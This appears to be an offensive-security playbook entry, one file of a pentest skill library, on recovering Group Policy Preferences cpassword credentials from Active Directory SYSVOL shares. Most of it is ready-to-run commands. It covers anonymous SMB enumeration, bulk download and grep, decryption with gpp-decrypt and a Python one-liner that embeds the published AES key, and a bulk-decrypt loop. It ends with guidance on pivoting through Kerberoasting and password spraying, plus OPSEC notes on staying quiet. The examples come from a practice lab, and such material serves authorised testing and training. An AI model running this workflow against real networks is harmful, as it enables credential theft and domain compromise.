# GPP cpassword

> Group Policy Preferences let admins push Windows local accounts via
> XML files in SYSVOL. The password is AES-encrypted with a key
> Microsoft *published* (MS14-025). Anyone with read access to SYSVOL
> can recover it.

## Objective
Decrypt cpassword fields embedded in `Groups.xml` (or other GPP files)
to obtain the cleartext credentials they encode.

## When To Use
- AD detected.
- SYSVOL or Replication share is readable (anonymous or with any cred).
- An XML file containing `cpassword="..."` is found.

## Detection Indicators
- File `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, `Printers.xml`,
  `Drives.xml`, `DataSources.xml`.
- Contains `cpassword="<base64>"`.
- Located under
  `\\<dc>\SYSVOL\<domain>\Policies\{<GUID>}\<MACHINE|USER>\Preferences\Groups\Groups.xml`
  or in `\\<dc>\Replication\...` as in Active.

## Enumeration Strategy

```bash
# anonymous SMB scan
smbmap -H <ip>
smbmap -H <ip> -u guest -p ''

# Replication / SYSVOL share readable?
smbclient //<ip>/Replication -N
smbclient //<ip>/SYSVOL -N

# recursive download
smbclient //<ip>/<share> -N -c 'recurse ON; prompt OFF; mget *'

# locally search
find . -iname "Groups.xml" -o -iname "Services.xml" -o -iname "ScheduledTasks.xml"
grep -RinE 'cpassword="[^"]+"' .
```

## Exploitation Workflow

```bash
# Extract the cpassword (the value of the cpassword attribute)
grep -oE 'cpassword="[^"]+"' Groups.xml
# cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

# Decrypt with one of:
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
# GPPstillStandingStrong2k18

# alternative
python3 -c 'from Crypto.Cipher import AES; from base64 import b64decode
key=b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
ct=b64decode("edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"+"=" * (-len("edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ")%4))
iv=b"\x00"*16
print(AES.new(key,AES.MODE_CBC,iv).decrypt(ct).decode("utf-16-le").rstrip())
'
```

## Commands

```bash
# Find any cpassword references in an SMB share dump
grep -Rni 'cpassword' /path/to/dump | head

# Bulk-decrypt
for cp in $(grep -h cpassword Groups.xml Services.xml ScheduledTasks.xml 2>/dev/null | grep -oE '"[^"]+"' | tr -d '"'); do
  echo "$cp -> $(gpp-decrypt $cp)"
done
```

## Tool Usage

- `gpp-decrypt` — Ruby tool from Kali; the canonical decryptor.
- `Get-GPPPassword` (PowerSploit) — Windows-side equivalent.
- `crackmapexec smb <ip> -u <u> -p <p> -M gpp_password` — module that
  finds and decrypts GPP passwords automatically.
- Manual Python with pycryptodome — when the appliance lacks
  `gpp-decrypt`.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Forgetting the cpassword may be padding-stripped | Decrypt fails | Re-pad with `=` to a multiple of 4 |
| Decrypting only `Groups.xml` | Miss creds in `Services.xml` etc. | Search all GPP-relevant XMLs |
| Trying to brute-force the cpassword | Wasting time | The key is published; just decrypt |
| Treating decrypted creds as just SVC password | Often domain user, not local | Test against domain (CME) |

## Decision-Making Logic

```
SMB anonymous → readable share?
  └─ download recursively
       └─ find . -iname "*.xml"
            └─ grep "cpassword=" everywhere
                 └─ found → decrypt all, validate creds
                 └─ none → other foothold paths
```

## Pivot Opportunities

The decrypted credential is an AD user (typically a service account
like `svc_admin`, `svc_install`, `svc_tgs`). Use it for:
- LDAP authenticated enumeration.
- BloodHound collection.
- Kerberoasting (with this user's cred, request other SPN tickets).
- Spraying across the domain (especially against local admins).

## OPSEC Considerations

- Reading a SYSVOL share is normal client behaviour; quiet.
- Decryption is offline; silent.
- Using the decrypted creds is loud at the destination service.

## Real HTB Examples

- **Active** — `Replication` share anonymous → `Groups.xml` →
  `SVC_TGS:GPPstillStandingStrong2k18`.
- **Granny / Grandpa** — older Windows; sometimes leak XML similarly.
- Real-world: very common in legacy estates that migrated from XP
  domain joins.

## Alternative Techniques

- **Unattend.xml** in `C:\Windows\Panther` — same idea, different
  format; cleartext creds.
- **`web.config`** with cleartext or encrypted connection strings —
  decryption with `aspnet_regiis -pdf`.
- **Group Managed Service Accounts (gMSA)** — modern replacement;
  password queryable via `Get-ADServiceAccount`.

## Automation Opportunities

```bash
crackmapexec smb <ip> -u '' -p '' -M gpp_password
# automatically finds and decrypts; works as long as the SYSVOL share is readable
```

## Checklist

- [ ] Confirm SYSVOL or Replication share readable
- [ ] Recursively download
- [ ] grep -i `cpassword` everywhere
- [ ] Decrypt every cpassword found
- [ ] Validate the decrypted cred against SMB
- [ ] Use cred for further enumeration

## Related Skills

- [`smb/anonymous-share-enumeration.md`](../smb/anonymous-share-enumeration.md)
- [`active-directory/anonymous-ad-enumeration.md`](anonymous-ad-enumeration.md)
- [`active-directory/kerberoasting.md`](kerberoasting.md)
- [`tool-usage/crackmapexec.md`](../tool-usage/crackmapexec.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
